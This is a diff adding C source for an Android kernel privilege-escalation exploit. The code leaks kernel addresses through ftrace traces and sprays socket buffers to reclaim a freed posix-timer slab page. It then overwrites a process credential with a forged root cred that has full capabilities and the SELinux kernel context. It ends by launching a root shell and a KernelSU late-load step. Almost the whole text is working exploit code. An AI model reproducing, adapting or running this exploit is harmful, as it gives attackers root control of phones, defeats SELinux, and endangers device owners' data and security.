+    if (!ksud || !*ksud || !pkg || !*pkg)
+    {
+        printf("LATE_LOAD_SKIP=env-missing ksud=%s pkg=%s\n",
+               ksud ? ksud : "(null)", pkg ? pkg : "(null)");
+        fflush(stdout);
+        return;
+    }
+    if (!kmi || !*kmi)
+        kmi = "android16-6.12";
+    snprintf(cmd, sizeof(cmd),
+             "'%s' late-load --kmi %s --allow-shell --package-name %s 2>&1; "
+             "echo LATE_LOAD_RC=$?",
+             ksud, kmi, pkg);
+    printf("LATE_LOAD_CMD=%s\n", cmd);
+    fflush(stdout);
+    printf("LATE_LOAD_SHELL_RC=%d\n", system(cmd));
+    fflush(stdout);
+}
+
+static int read_panic_on_warn(void)
+{
+    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
+    int value = -1;
+
+    if (f)
+    {
+        if (fscanf(f, "%d", &value) != 1)
+            value = -1;
+        fclose(f);
+    }
+    logf("[ksu] panic_on_warn=%d\n", value);
+    return value;
+}
+
+struct plant_res
+{
+    unsigned long long A;
+    int ok;
+    int retry;
+};
+
+static void run_plant(unsigned long long target, int tag, int mode,
+                      struct plant_res *res, unsigned char *raw);
+
+static int stage_write(unsigned long long target, int mode,
+                       const char *what, unsigned char *raw,
+                       struct plant_res *out)
+{
+    struct plant_res r;
+
+    for (int attempt = 1; attempt <= 3; attempt++)
+    {
+        memset(&r, 0, sizeof(r));
+        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
+             mode == 2 ? "fake" : "zero", attempt);
+        run_plant(target, 1, mode, &r, raw);
+        if (r.ok)
+        {
+            if (out)
+                *out = r;
+            return 0;
+        }
+        if (!r.retry)
+        {
+            logf("[-] stage %s failed\n", what);
+            return -1;
+        }
+    }
+    logf("[-] stage %s exhausted retries\n", what);
+    return -1;
+}
+
+#define SPRAY_THREADS 8
+#define SPRAY_SOCKS 4096
+#define SPRAY_PRE 4096
+#define SPRAY_POST 4096
+static _Atomic int g_burst, g_round, g_stop_spray;
+static int g_pool[SPRAY_SOCKS][2];
+static int g_pool_n;
+static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
+static _Atomic int g_spray_tids[SPRAY_THREADS];
+
+struct spray_arg
+{
+    unsigned char *payload;
+    int sock_first, sock_count, cpu, idx;
+};
+
+static void ensure_pool(void)
+{
+    int snd = 16 << 20;
+
+    if (g_pool_n)
+        return;
+    for (int i = 0; i < SPRAY_SOCKS; i++)
+    {
+        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
+            break;
+        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
+        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
+        g_pool_n++;
+    }
+    if (!g_pool_n)
+        fail_exit("pool");
+}
+
+static void ensure_raw(void)
+{
+    for (int cpu = 0; cpu < 8; cpu++)
+    {
+        char path[128];
+
+        if (g_rawfd[cpu] >= 0)
+            continue;
+        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
+    }
+}
+
+static long read_fd(int fd, unsigned char *buf, size_t cap)
+{
+    size_t tot = 0;
+
+    if (fd < 0)
+        return 0;
+    while (tot < cap)
+    {
+        ssize_t r = read(fd, buf + tot, cap - tot);
+
+        if (r <= 0)
+            break;
+        tot += (size_t)r;
+    }
+    return (long)tot;
+}
+
+/*
+ * A page_alloc for the victim pfn is only a hit if one of our spray threads
+ * performed it.  A system allocation can take the freed page first; reaping
+ * that node would treat the system page contents as an rb_node and panic.
+ */
+static int scan_page_alloc_ours(const unsigned char *b, size_t n,
+                                unsigned long long pfn)
+{
+    for (size_t i = 16; i + 12 <= n; i += 4)
+    {
+        int pid;
+
+        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
+            continue;
+        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
+            continue;
+        pid = (int)u32(b, i - 4);
+        for (int j = 0; j < SPRAY_THREADS; j++)
+            if (pid == atomic_load(&g_spray_tids[j]))
+                return 1;
+    }
+    return 0;
+}
+
+static int scan_page_alloc_pid(const unsigned char *b, size_t n,
+                               unsigned long long pfn, int *pid)
+{
+    for (size_t i = 16; i + 12 <= n; i += 4)
+    {
+        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
+            continue;
+        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
+            continue;
+        *pid = (int)u32(b, i - 4);
+        return 1;
+    }
+    return 0;
+}
+
+static void *spray_thread(void *x)
+{
+    struct spray_arg *a = x;
+    int w = 0, served = 0;
+
+    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
+    pin(a->cpu);
+    while (!atomic_load(&g_burst))
+        sched_yield();
+    /* Phase 1 runs before the target execs; it catches an early free. */
+    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
+    {
+        int k = a->sock_first + (w % a->sock_count);
+
+        (void)write(g_pool[k][0], a->payload, SOCKBUF);
+        w++;
+    }
+    /* Each released round tops the socket queue up by SPRAY_POST writes.
+     * The parent releases rounds together with the churn that forces the
+     * victim slab back to the buddy allocator, so an order-1 allocation is
+     * already in flight when the page becomes free. */
+    while (!atomic_load(&g_stop_spray))
+    {
+        int r = atomic_load(&g_round);
+
+        if (served < r)
+        {
+            int end = SPRAY_PRE + (served + 1) * SPRAY_POST;
+
+            while (!atomic_load(&g_stop_spray) && w < end)
+            {
+                int k = a->sock_first + (w % a->sock_count);
+
+                (void)write(g_pool[k][0], a->payload, SOCKBUF);
+                w++;
+            }
+            served++;
+        }
+        else
+            sched_yield();
+    }
+    return NULL;
+}
+
+static void run_plant(unsigned long long target, int tag, int mode,
+                      struct plant_res *res, unsigned char *raw)
+{
+    unsigned long long ptrs[NTIMERS];
+    unsigned long long pfn = 0, slab_pfn = 0;
+    unsigned char *payload = NULL;
+    pthread_t th[SPRAY_THREADS];
+    struct spray_arg args[SPRAY_THREADS];
+    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
+    memset(res, 0, sizeof(*res));
+    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
+    {
+        logf("[-] plant%d pipe failed\n", tag);
+        return;
+    }
+    pid_t T = fork();
+    if (T < 0)
+    {
+        logf("[-] plant%d fork failed\n", tag);
+        return;
+    }
+    if (T == 0)
+    {
+        close(ready_p[0]);
+        close(ack_p[1]);
+        close(tid_p[0]);
+        close(timer_go[1]);
+        g_ready_w = ready_p[1];
+        g_ack_r = ack_p[0];
+        g_tid_w = tid_p[1];
+        g_timer_go_r = timer_go[0];
+        run_target();
+        _exit(115);
+    }
+    close(ready_p[1]);
+    close(ack_p[0]);
+    close(tid_p[1]);
+    close(timer_go[0]);
+    g_timer_go_w = timer_go[1];
+    char ch;
+    if (read(ready_p[0], &ch, 1) != 1)
+    {
+        logf("[-] plant%d trigger never ready\n", tag);
+        kill(T, SIGKILL);
+        waitpid(T, NULL, 0);
+        return;
+    }
+    trace_start();
+    if (write(ack_p[1], "A", 1) != 1)
+        logf("[-] ack failed\n");
+    int etid = 0;
+    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
+        logf("[-] exec tid not received\n");
+
+    /*
+     * The exec thread is paused after creating its 4096 timers.  Capture V,
+     * the slab pfn and the linear-map base now, before the exec/free, so the
+     * spray is already running when the victim slab returns to the buddy.
+     */
+    long n = read_cpu(g_cpu, raw, 48u << 20);
+    unsigned long long kept[NTIMERS];
+    unsigned long long V = 0, site0 = 0;
+    unsigned long long vslab;
+    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;
+
+    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
+                                     &site0)
+                 : 0;
+    if (!nrec || !site0)
+    {
+        trace_stop();
+        kill(T, SIGKILL);
+        waitpid(T, NULL, 0);
+        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
+        return;
+    }
+    {
+        int ns = 0, np = 0;
+        unsigned long long base;
+
+        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
+        if (!base)
+            base = g_base;
+        if (!base || base < 0xffffff0000000000ULL ||
+            base > 0xffffffc000000000ULL)
+        {
+            trace_stop();
+            kill(T, SIGKILL);
+            waitpid(T, NULL, 0);
+            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
+                 tag, base, ns, np, nrec);
+            return;
+        }
+        g_base = base;
+        /*
+         * The linear map is [base, 0xffffffc000000000) on this VA layout;
+         * physical RAM is sparse and extends well past 16 GiB, so do not
+         * bound by RAM size.  A pointer outside this window is a stale
+         * kmem record or a mis-scanned site collision and must not shift
+         * the victim index.
+         */
+        for (int i = 0; i < nrec; i++)
+            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
+                kept[nkeep++] = ptrs[i];
+        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
+             tag, base, ns, np, nrec, nkeep);
+    }
+    if (nkeep <= VICTIM_IDX)
+    {
+        trace_stop();
+        kill(T, SIGKILL);
+        waitpid(T, NULL, 0);
+        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
+        return;
+    }
+    V = kept[VICTIM_IDX];
+    vslab = V & ~0x1fffULL;
+    for (int i = 0; i < nkeep; i++)
+        if ((kept[i] & ~0x1fffULL) == vslab)
+            slab_own++;
+    pfn = (V - g_base) >> 12;
+    slab_pfn = pfn & ~1ULL;
+    g_slide = site0 - STATIC_TIMER_SITE;
+
+    {
+        size_t off = (size_t)((V & 0x1fff) + KIT_IT_OFF);
+
+        payload = malloc(SOCKBUF);
+        if (!payload)
+        {
+            kill(T, SIGKILL);
+            waitpid(T, NULL, 0);
+            return;
+        }
+        if (mode == 2)
+        {
+            unsigned long long page = V & ~0x1fffULL;
+            unsigned long long *c = (unsigned long long *)(payload + off);
+            size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
+                                       0x100, 0x0};
+            int fit = 0;
+
+            if (off + 0xb8 > 0x2000)
+            {
+                logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
+                     tag, off);
+                kill(T, SIGKILL);
+                waitpid(T, NULL, 0);
+                free(payload);
+                payload = NULL;
+                res->retry = 1;
+                return;
+            }
+            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
+            {
+                size_t b = cand[i];
+
+                if (b + 0x40 > 0x2000)
+                    continue;
+                if (b + 0x40 <= off || off + 0xb8 <= b)
+                {
+                    blob = b;
+                    fit = 1;
+                    break;
+                }
+            }
+            if (!fit)
+            {
+                kill(T, SIGKILL);
+                waitpid(T, NULL, 0);
+                free(payload);
+                payload = NULL;
+                res->retry = 1;
+                return;
+            }
+            build_payload(payload, off, V + KIT_IT_OFF, target);
+            /* c[0]=A (usage), c[1]=uid/gid will be dirtied by rb erase,
+             * c[2]=suid/sgid = target, both fixed by later zero plants. */
+            c[3] = 0; /* euid/egid */
+            c[4] = 0; /* fsuid/fsgid */
+            c[5] = 0; /* securebits */
+            for (int i = 6; i <= 10; i++)
+                c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
+            *(unsigned long long *)(payload + off + 0x80) =
+                page + blob; /* security */
+            *(unsigned long long *)(payload + off + 0x88) =
+                ROOT_USER_STATIC + g_slide;
+            *(unsigned long long *)(payload + off + 0x90) =
+                INIT_USER_NS_STATIC + g_slide;
+            *(unsigned long long *)(payload + off + 0x98) =
+                INIT_UCOUNTS_STATIC + g_slide;
+            *(unsigned long long *)(payload + off + 0xa0) =
+                INIT_GROUPS_STATIC + g_slide;
+            *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
+                SELINUX_SID_KERNEL;
+            *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF + 4) =
+                SELINUX_SID_KERNEL;
+            logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx\n",
+                 tag, off, blob, page + blob);
+        }
+        else
+        {
+            build_payload(payload, off, 0, target);
+        }
+        slab_usage("pre-exec");
+        logf("[+] plant%d V=%#llx A=%#llx pfn=%#llx slab=%#llx slide=%#llx "
+             "recs=%d slab_own=%d/32 base=%#llx\n",
+             tag, V, V + KIT_IT_OFF, pfn, slab_pfn, g_slide, nrec, slab_own,
+             g_base);
+    }
+
+    atomic_store(&g_burst, 0);
+    atomic_store(&g_round, 0);
+    atomic_store(&g_stop_spray, 0);
+    {
+        int per = g_pool_n / SPRAY_THREADS;
+
+        for (int i = 0; i < SPRAY_THREADS; i++)
+        {
+            args[i].payload = payload;
+            args[i].sock_first = i * per;
+            args[i].sock_count = per;
+            args[i].cpu = i;
+            args[i].idx = i;
+            atomic_store(&g_spray_tids[i], -1);
+            pthread_create(&th[i], NULL, spray_thread, &args[i]);
+        }
+    }
+    /* Start phase 1 now: it covers the exec/kill/free window; phase 2 is
+     * released when the victim pfn is seen in mm_page_free. */
+    atomic_store(&g_burst, 1);
+    /*
+     * Release the race; V is already captured.
+     */
+    if (g_timer_go_w >= 0)
+    {
+        if (write(g_timer_go_w, "x", 1) != 1)
+            logf("[-] timer go failed\n");
+        close(g_timer_go_w);
+        g_timer_go_w = -1;
+    }
+
+    siginfo_t si;
+    if (wait_zombie(T, &si))
+    {
+        atomic_store(&g_stop_spray, 1);
+        for (int i = 0; i < SPRAY_THREADS; i++)
+            pthread_join(th[i], NULL);
+        trace_stop();
+        logf("[-] plant%d no zombie; holding child\n", tag);
+        g_held++;
+        return;
+    }
+    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
+         tag, T, etid, si.si_code, si.si_status);
+    if (si.si_code != CLD_KILLED)
+    {
+        atomic_store(&g_stop_spray, 1);
+        for (int i = 0; i < SPRAY_THREADS; i++)
+            pthread_join(th[i], NULL);
+        trace_stop();
+        if (si.si_code == CLD_EXITED)
+        {
+            int st = 0;
+
+            /* execve succeeded: no stale node, safe to reap and retry. */
+            waitpid(T, &st, 0);
+            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
+                 tag, si.si_status);
+            res->retry = 1;
+            free(payload);
+            return;
+        }
+        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
+        g_held++;
+        return;
+    }
+    /*
+     * The churn is what pushes an empty posix_timers_cache slab back to the
+     * buddy allocator, and the free lands ~40 ms after it starts.  Release
+     * the next spray round and churn together so an order-1 allocation from
+     * our own threads is already in flight when the page becomes free,
+     * instead of starting the spray after the ftrace free record is seen.
+     */
+    long t1 = now_ms();
+    int hit = 0, churns = 0, rounds = 0, started = 0, theft = -1;
+    long t_round = t1;
+
+    while (!hit && !free_seen && now_ms() - t1 < WAIT_FREE_MS)
+    {
+        for (int cpu = 0; cpu < 8 && !hit && !free_seen; cpu++)
+        {
+            long m = read_fd(g_rawfd[cpu], raw, 16u << 20);
+            int pid;
+
+            if (m <= 0)
+                continue;
+            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
+            {
+                hit = 1;
+            }
+            else if (scan_page_free(raw, (size_t)m, slab_pfn))
+            {
+                free_seen = 1;
+                if (!rounds && rounds < SPRAY_MAX_ROUNDS)
+                {
+                    rounds = 1;
+                    t_round = now_ms();
+                    atomic_store(&g_round, rounds);
+                    logf("[dbg] plant%d spray round=%d at free (no churn)\n",
+                         tag, rounds);
+                }
+            }
+            else if (theft < 0 &&
+                     scan_page_alloc_pid(raw, (size_t)m, slab_pfn, &pid))
+            {
+                theft = pid;
+                logf("[dbg] plant%d victim pfn allocated by pid=%d\n",
+                     tag, theft);
+            }
+        }
+        if (!hit && !free_seen)
+        {
+            long el = now_ms() - t1;
+
+            if (!started)
+            {
+                started = 1;
+                churns = 1;
+                if (rounds < SPRAY_MAX_ROUNDS)
+                {
+                    rounds++;
+                    t_round = now_ms();
+                    atomic_store(&g_round, rounds);
+                }
+                churn_timers(CHURN_TIMERS);
+                logf("[dbg] plant%d churn=%d round=%d\n", tag, churns,
+                     rounds);
+            }
+            else if (el >= (long)churns * CHURN_ROUND_MS &&
+                     churns < CHURN_MAX)
+            {
+                churns++;
+                if (rounds < SPRAY_MAX_ROUNDS)
+                {
+                    rounds++;
+                    t_round = now_ms();
+                    atomic_store(&g_round, rounds);
+                }
+                churn_timers(CHURN_TIMERS);
+                logf("[dbg] plant%d churn=%d round=%d\n", tag, churns,
+                     rounds);
+            }
+            usleep(10000);
+        }
+    }
+    if (!free_seen && !hit)
+    {
+        atomic_store(&g_stop_spray, 1);
+        for (int i = 0; i < SPRAY_THREADS; i++)
+            pthread_join(th[i], NULL);
+        trace_stop();
+        logf("[-] plant%d page not freed in %dms (churns=%d rounds=%d); "
+             "holding zombie\n", tag, WAIT_FREE_MS, churns, rounds);
+        g_held++;
+        return;
+    }
+    {
+        long t2 = now_ms();
+
+        while (!hit && now_ms() - t2 < WAIT_HIT_MS)
+        {
+            for (int cpu = 0; cpu < 8 && !hit; cpu++)
+            {
+                long m = read_fd(g_rawfd[cpu], raw, 16u << 20);
+                int pid;
+
+                if (m <= 0)
+                    continue;
+                if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
+                    hit = 1;
+                else if (theft < 0 &&
+                         scan_page_alloc_pid(raw, (size_t)m, slab_pfn, &pid))
+                {
+                    theft = pid;
+                    logf("[dbg] plant%d victim pfn allocated by pid=%d\n",
+                         tag, theft);
+                }
+            }
+            if (!hit && rounds < SPRAY_MAX_ROUNDS &&
+                now_ms() - t_round >= SPRAY_ROUND_MS)
+            {
+                rounds++;
+                t_round = now_ms();
+                atomic_store(&g_round, rounds);
+                logf("[dbg] plant%d spray round=%d (free_seen=%d)\n", tag,
+                     rounds, free_seen);
+            }
+            if (!hit)
+                usleep(10000);
+        }
+    }
+    atomic_store(&g_stop_spray, 1);
+    for (int i = 0; i < SPRAY_THREADS; i++)
+        pthread_join(th[i], NULL);
+    trace_stop();
+    for (int cpu = 0; cpu < 8 && !hit; cpu++)
+    {
+        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
+
+        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
+            hit = 1;
+    }
+    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
+         tag, free_seen, hit, now_ms() - t1);
+    if (!hit)
+    {
+        logf("[-] plant%d burst missed; holding zombie\n", tag);
+        g_held++;
+        return;
+    }
+
+    usleep(1000);
+    int st = 0;
+    waitpid(T, &st, 0);
+    logf("[+] plant%d reaped status=%#x\n", tag, st);
+    res->A = V + KIT_IT_OFF;
+    res->ok = 1;
+    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
+         mode == 2 ? "fake" : "zero", target);
+    free(payload);
+}
+
+/*
+ * The child execs this binary so that it owns a private real cred.  The exec
+ * allocation is captured from the kmem trace; the child then blocks on fd 3
+ * and reports readiness on fd 4.  On success it returns the cred address and
+ * hands the pipe fds to the caller.
+ */
+static unsigned long long leak_cred(unsigned char *raw,
+                                    pid_t *out_pid, int *out_go, int *out_st,
+                                    int shell_mode,
+                                    unsigned long long *task_out)
+{
+    for (int attempt = 0; attempt < 4; attempt++)
+    {
+        int go[2], st[2];
+        pid_t p;
+        long n;
+        int c = 0, hello = 0, tc = 0;
+        unsigned long long R = 0, site = 0, task = 0;
+
+        if (pipe(go) || pipe(st))
+            return 0;
+        /*
+         * Start tracing before fork so copy_process()'s task_struct
+         * allocation is in the buffer.  The exec cred allocation follows.
+         */
+        trace_start();
+        p = fork();
+        if (p == 0)
+        {
+            int g2, s2;
+            char ch;
+
+            close(go[1]);
+            close(st[0]);
+            g2 = fcntl(go[0], F_DUPFD, 20);
+            s2 = fcntl(st[1], F_DUPFD, 20);
+            if (g2 < 0 || s2 < 0)
+                _exit(125);
+            close(go[0]);
+            close(st[1]);
+            dup2(g2, 3);
+            close(g2);
+            dup2(s2, 4);
+            close(s2);
+            pin(g_cpu);
+            if (read(3, &ch, 1) != 1)
+                _exit(126);
+            {
+                const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
+#if defined(HOOKS_GATE)
+                char gbuf[8], mbuf[32], vbuf[4];
+
+                snprintf(gbuf, sizeof(gbuf), "%d", g_gate);
+                snprintf(mbuf, sizeof(mbuf), "%#llx", g_gate_modules);
+                snprintf(vbuf, sizeof(vbuf), "%d", g_gate_114);
+                {
+                    char *const av_gate[] = {(char *)"/proc/self/exe",
+                                             (char *)"wait", (char *)cmode,
+                                             gbuf, mbuf, vbuf, NULL};
+                    execve("/proc/self/exe", av_gate, environ);
+                }
+#else
+                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
+                                    (char *)cmode, NULL};
+
+                execve("/proc/self/exe", av, environ);
+#endif
+            }
+            _exit(127);
+        }
+        if (p < 0)
+        {
+            close(go[0]);
+            close(go[1]);
+            close(st[0]);
+            close(st[1]);
+            return 0;
+        }
+        close(go[0]);
+        close(st[1]);
+        if (write(go[1], "A", 1) != 1)
+            logf("[!] leak go write failed\n");
+        {
+            struct pollfd pf = {.fd = st[0], .events = POLLIN};
+
+            if (poll(&pf, 1, 1000) > 0)
+                (void)read(st[0], &hello, sizeof(hello));
+        }
+        usleep(10000);
+        trace_stop();
+        n = read_cpu(g_cpu, raw, 48u << 20);
+        if (n > 0)
+        {
+            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
+            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
+        }
+        if (R && hello == CHILD_HELLO && (!g_fake_stage || task))
+        {
+            {
+                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
+                     "recs=%d task=%#llx task_recs=%d\n",
+                     attempt, p, R, site & 0x1fffff, c, task, tc);
+                *out_pid = p;
+                *out_go = go[1];
+                *out_st = st[0];
+                *task_out = task;
+                return R;
+            }
+        }
+        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
+             "task=%#llx task_recs=%d failed\n",
+             attempt, p, R, hello, c, task, tc);
+        close(go[1]);
+        close(st[0]);
+        kill(p, SIGKILL);
+        waitpid(p, NULL, 0);
+    }
+    return 0;
+}
+
+
+static int wait_child_main(const char *mode)
+{
+    struct child_report rep;
+    char ch;
+    int hello = CHILD_HELLO;
+    ssize_t wake_ret;
+    int wake_errno;
+
+    pin(g_cpu);
+    prctl(PR_SET_NAME, "child-hello", 0, 0, 0);
+    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
+        _exit(130);
+    errno = 0;
+    wake_ret = read(3, &ch, 1);
+    wake_errno = errno;
+    prctl(PR_SET_NAME, "child-woke", 0, 0, 0);
+
+    memset(&rep, 0, sizeof(rep));
+    rep.magic = CHILD_MAGIC;
+    rep.stage = wake_ret == 1 ? CHILD_STAGE_WOKE : CHILD_STAGE_WAKE_READ_FAIL;
+    rep.wake_ret = (int)wake_ret;
+    rep.wake_errno = wake_errno;
+    if (wake_ret != 1)
+    {
+        (void)syscall(SYS_write, 4, &rep, sizeof(rep));
+        close(4);
+        _exit(131);
+    }
+    rep.uid = (int)syscall(SYS_getuid);
+    rep.euid = (int)syscall(SYS_geteuid);
+    prctl(PR_SET_NAME, "child-uid", 0, 0, 0);
+    if (!strcmp(mode, "fake"))
+    {
+        /*
+         * Report immediately after the wake read.  The fake cred is a
+         * short-lived kernel object; a stdio/fsync failure or an exec-time
+         * signal must not hide the uid observed at the handoff.
+         */
+#if defined(HOOKS_GATE)
+        if (g_gate)
+        {
+            unsigned long long slide = 0;
+
+            if (read(3, &slide, sizeof(slide)) != (ssize_t)sizeof(slide))
+                slide = 0;
+            g_child_slide = slide;
+            logf("[load] slide=%#llx\n", slide);
+            log_kernel_flags("child");
+            rep.gate_addr = leak_g_slot();
+            if (!rep.gate_addr)
+            {
+                logf("[gate] leak retry\n");
+                rep.gate_addr = leak_g_slot();
+            }
+        }
+#endif
+        prctl(PR_SET_NAME, "child-report", 0, 0, 0);
+        (void)syscall(SYS_write, 4, &rep, sizeof(rep));
+        prctl(PR_SET_NAME, "child-sent", 0, 0, 0);
+        close(4);
+#if defined(HOOKS_GATE)
+        if (g_gate)
+        {
+            char ack;
+
+            if (read(3, &ack, 1) != 1)
+                logf("[gate] ack missing\n");
+            else
+                logf("[auth] post-ack insko=%d unlocked=%d em=%d\n",
+                     read_auth_bit("insko_dfd_on"),
+                     read_auth_bit("unlocked"),
+                     read_auth_bit("em_authed"));
+        }
+#endif
+    }
+    close(3);
+    prctl(PR_SET_NAME, "child-log", 0, 0, 0);
+    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
+    if (rep.uid != 0)
+    {
+        rep.setuid_ret = -1;
+        if (strcmp(mode, "fake"))
+        {
+            (void)syscall(SYS_write, 4, &rep, sizeof(rep));
+            close(4);
+        }
+        logf("[-] child uid is not 0: cred write did not land\n");
+        _exit(3);
+    }
+
+    if (!strcmp(mode, "fake"))
+    {
+#if defined(HOOKS_GATE)
+        if (g_gate)
+        {
+            logf("[fake] child uid=%d euid=%d; one-shot late-load then park\n",
+                 rep.uid, rep.euid);
+            {
+                pid_t worker = fork();
+
+                if (worker == 0)
+                {
+                    prctl(PR_SET_NAME, "child-load", 0, 0, 0);
+                    capture_pstore();
+                    {
+                        pthread_t th;
+
+                        if (!pthread_create(&th, NULL, dmesg_watch, NULL))
+                            pthread_detach(th);
+                    }
+                    run_late_load_script(g_child_slide);
+                    _exit(0);
+                }
+                if (worker < 0)
+                    logf("[load] worker fork failed errno=%d\n", errno);
+                else
+                    logf("[load] worker pid=%d\n", (int)worker);
+            }
+            prctl(PR_SET_NAME, "child-hold", 0, 0, 0);
+        }
+        else
+#endif
+        {
+            prctl(PR_SET_NAME, "child-load", 0, 0, 0);
+            logf("[fake] child uid=%d euid=%d; one-shot late-load then park\n",
+                 rep.uid, rep.euid);
+            run_late_load_script(g_child_slide);
+        }
+        for (;;)
+            pause();
+    }
+
+    /*
+     * Plant 1 zeroes uid+gid only; egid is still 2000.  If it stays that way
+     * across execve(), cap_bprm's setgid downgrade intersects permitted with
+     * the old (empty) set and the expanded bset never becomes effective.
+     */
+    errno = 0;
+    {
+        long sg = syscall(SYS_setresgid, 0, 0, 0);
+
+        logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
+    }
+    errno = 0;
+    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
+    rep.setuid_errno = errno;
+    {
+        uid_t ru = 0, eu = 0, su = 0;
+
+        getresuid(&ru, &eu, &su);
+        rep.ruid = (int)ru;
+        rep.reuid = (int)eu;
+        rep.rsuid = (int)su;
+    }
+    (void)write(4, &rep, sizeof(rep));
+    close(4);
+    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
+         rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
+    if (rep.setuid_ret != 0)
+    {
+        logf("[-] setuid(0) failed; not running a shell\n");
+        _exit(4);
+    }
+
+    {
+        char *const envp[] = {
+            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
+            (char *)"HOME=/",
+            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
+            NULL};
+
+        if (!strcmp(mode, "shell"))
+        {
+            char *const av[] = {(char *)"sh", (char *)"-i", NULL};
+
+            execve("/system/bin/sh", av, envp);
+        }
+        else
+        {
+            char *const av[] = {(char *)"sh", (char *)"-c",
+                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
+                                        "echo ROOT_SHELL_OK",
+                                NULL};
+
+            execve("/system/bin/sh", av, envp);
+        }
+    }
+    logf("[-] shell exec failed errno=%d\n", errno);
+    _exit(5);
+}
+
+int main(int argc, char **argv)
+{
+    unsigned char *raw;
+    int shell_mode = 0, leak_only = 0, ids_only = 0, probe_only = 0;
+    int rooted = 0;
+
+    setvbuf(stdout, NULL, _IONBF, 0);
+    if (argc > 1 && !strcmp(argv[1], "wait"))
+    {
+#if defined(HOOKS_GATE)
+        if (argc > 4)
+        {
+            g_gate = atoi(argv[3]);
+            g_gate_modules = strtoull(argv[4], NULL, 0);
+        }
+        if (argc > 5)
+            g_gate_114 = atoi(argv[5]);
+#endif
+        return wait_child_main(argc > 2 ? argv[2] : "verify");
+    }
+
+    if (argc > 1 && !strcmp(argv[1], "shell"))
+        shell_mode = 1;
+    if (argc > 1 && !strcmp(argv[1], "leak"))
+        leak_only = 1;
+    if (argc > 1 && !strcmp(argv[1], "ids"))
+        ids_only = 1;
+    if (argc > 1 && !strcmp(argv[1], "probe"))
+        probe_only = 1;
+    if (argc > 1 && (!strcmp(argv[1], "fake") || !strcmp(argv[1], "--auto")))
+        g_fake_stage = 1;
+    g_start_ms = now_ms();
+
+    raw = malloc(48u << 20);
+    if (!raw)
+        return 1;
+    if (argc > 2 && !strcmp(argv[1], "cpu"))
+        g_cpu = atoi(argv[2]);
+
+    if (argv[0] && argv[0][0] == '\0')
+        _exit(42);
+
+#if defined(PROBE_ONLY)
+    probe_only = 1;
+#endif
+    if (probe_only)
+        return probe_main(raw);
+
+    {
+        struct rlimit rl;
+
+        if (!getrlimit(RLIMIT_NOFILE, &rl))
+        {
+            rl.rlim_cur = rl.rlim_max;
+            if (rl.rlim_cur > 65536)
+                rl.rlim_cur = 65536;
+            (void)setrlimit(RLIMIT_NOFILE, &rl);
+        }
+    }
+
+    if (!ids_only && !leak_only && auto_preflight())
+        return 3;
+    pin(g_cpu);
+    logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
+    enable_events();
+    kick_rss();
+    usleep(50000);
+    stop_rss_flood();
+
+    if (discover_page_types(raw) != 0)
+        return 1;
+    if (ids_only)
+        return 0;
+
+    g_base = calibrate_base(raw);
+    if (!g_base)
+    {
+        logf("[-] base calibration failed\n");
+        return 1;
+    }
+    prefill_timers(PREFILL_TIMERS);
